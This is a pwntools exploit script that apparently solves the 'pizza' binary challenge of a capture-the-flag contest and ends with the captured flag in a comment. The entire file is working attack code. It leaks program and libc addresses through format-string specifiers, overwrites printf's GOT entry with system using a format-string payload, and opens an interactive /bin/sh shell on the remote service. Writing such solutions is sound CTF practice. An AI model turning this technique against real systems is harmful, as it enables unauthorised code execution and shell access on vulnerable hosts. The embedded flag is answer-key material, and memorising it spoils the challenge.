#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./pizza")
libc = ELF("./libc.so.6")
#libc=exe.libc

context.binary = exe

REMOTE_NC_CMD    = "nc chall.lac.tf 31134"    # `nc <host> <port>`

bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))

GDB_SCRIPT = """
set follow-fork-mode parent
set follow-exec-mode same
c
"""

def conn():
    if args.LOCAL:
        return process([exe.path])
    
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=GDB_SCRIPT)
    
    return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))

def main():
    
    r = conn()

    r.sendline(b"12")
    r.sendline(f"%{49}$p".encode()) #main
    
    r.sendline(b"12")
    r.sendline(f"%{49}$p".encode()) #main

    r.sendline(b"12")
    r.sendline(f"%{49}$p".encode()) #main

    r.recvuntil(b"that you chose:\n")
    
    leak=[]
    for _ in range(3):
        leak.append(r.recvline()[:-1])

    exe.address = int(leak[0],16) - exe.sym.main

    r.sendline(b"y")
    r.sendline(b"12")
    r.sendline(f"%{7}$sBBBB".encode() + p64(exe.got.printf))

    r.sendline(b"12")
    r.sendline(f"%{7}$sBBBB".encode() + p64(exe.got.printf))

    r.sendline(b"12")
    r.sendline(f"%{7}$sBBBB".encode() + p64(exe.got.printf))

    r.recvuntil(b"that you chose:\n")

    leak=[]
    for _ in range(3):
        leak.append(r.recvuntil(b"B")[:-1])
  
    libc.address = u64(leak[0].ljust(8,b"\x00")) - libc.sym.printf

    r.sendline(b"y")

    payload = fmtstr_payload(6, {exe.got.printf:libc.sym.system}, write_size='short')

    r.sendline(b"12")
    r.sendline(payload)
    r.sendline(b"12")
    r.sendline(b"/bin/sh\x00")
    r.sendline(b"1")

    r.interactive()
    #lactf{golf_balls_taste_great_2tscx63xm3ndvycw}

if __name__ == "__main__":
    main()